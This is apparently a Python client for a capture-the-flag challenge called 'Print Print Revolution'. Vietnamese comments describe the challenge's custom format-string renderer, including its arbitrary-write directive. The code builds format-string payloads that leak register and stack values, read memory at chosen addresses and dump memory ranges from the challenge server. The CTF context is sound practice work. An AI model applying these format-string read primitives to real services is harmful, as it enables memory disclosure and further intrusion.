#!/usr/bin/env python3
"""Client cho renderer tu che trong bai Print Print Revolution.

Grammar cua renderer (doc tu 0x401330):
  %%            -> in ra '%'
  %<n>$s        -> in chuoi tai dia chi = arg n
  %<n>$p / %x   -> in gia tri arg n duoi dang 16 chu so hex
  %<n>$w        -> ghi arg n+1 vao dia chi arg n, in 'ok'
  %s %p %w      -> nhu tren nhung dung bo dem arg tang dan (ebx)
arg 1..5 = rsi,rdx,rcx,r8,r9 luc goi renderer; arg 6+k = 8 byte tai buf[8k].

Dung:  python probe.py <lenh>
"""
import socket
import sys
import time

HOST = "chal.sunshinectf.games"
PORT = 26002


class Renderer:
    def __init__(self, host=HOST, port=PORT, timeout=8):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.buf = b""
        self.drain(until=b"score> ")

    def _read(self, deadline=1.5):
        self.s.settimeout(deadline)
        try:
            while True:
                c = self.s.recv(4096)
                if not c:
                    break
                self.buf += c
        except socket.timeout:
            pass
        return self.buf

    def drain(self, until=b"score> ", deadline=1.5):
        """Doc toi khi gap marker. Server luon ket thuc phan hoi bang 'score> '
        truoc khi block o read(), nen thay marker la dung lai - khong can doi
        timeout lan cuoi (neu doi thi moi goi mat ca giay)."""
        end = self.buf.find(until)
        if end < 0:
            self.s.settimeout(deadline)
            t0 = time.time()
            while end < 0:
                left = deadline - (time.time() - t0)
                if left <= 0:
                    break
                self.s.settimeout(left)
                try:
                    c = self.s.recv(4096)
                except socket.timeout:
                    break
                if not c:
                    break
                self.buf += c
                end = self.buf.find(until)
        out, self.buf = self.buf[:max(end, 0)], self.buf[end + len(until):] if end >= 0 else b""
        return out

    def render(self, payload, deadline=2.0):
        self.s.sendall(payload + b"\n")
        time.sleep(0.15)
        return self.drain(b"score> ", deadline)

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def slots_for(spec: bytes, base_align=8):
    """Dat cac slot 8 byte ngay sau doan format, tra ve (so thu tu arg cua slot 0, cach tinh offset)."""
    off = max(16, ((len(spec) + 1 + base_align - 1) // base_align) * base_align)
    return 6 + off // 8, off


def build(spec: bytes, slots):
    """slots: danh sach byte(8) dat lien tiep nhau; spec phai <= 16 byte de khong de chan."""
    first, off = slots_for(spec)
    p = spec + b"\n"
    p += b"." * (off - len(p))
    for v in slots:
        assert len(v) == 8
        p += v
    return p, first


def peek(r, addr):
    """Doc chuoi tai dia chi addr qua %8$s (slot 8 byte dau tien nam sau doan format)."""
    payload, _ = build(b"%8$s", [addr.to_bytes(8, "little")])
    return r.render(payload)


if __name__ == "__main__":
    r = Renderer()
    print("[*] banner:", r.drain())
    r.buf = b""
    cmd = sys.argv[1] if len(sys.argv) > 1 else "regs"
    if cmd == "regs":
        print("[*] args 1..5 (register leftovers):")
        print(r.render(b"%1$p %2$p %3$p %4$p %5$p"))
        print("[*] args 6..40 (stack tu buf tro len):")
        for lo in range(6, 41, 10):
            spec = b" ".join(b"%%%d$p" % i for i in range(lo, lo + 10))
            print(f"  {lo:3d}:", r.render(spec))
    elif cmd == "peek":
        print(peek(r, int(sys.argv[2], 0)))
    elif cmd == "dump":
        addr = int(sys.argv[2], 0)
        for k in range(0, int(sys.argv[3])):
            payload, _ = build(b"%8$s", [(addr + 8 * k).to_bytes(8, "little")])
            print(f"  {addr + 8*k:#x}:", r.render(payload))
    r.close()

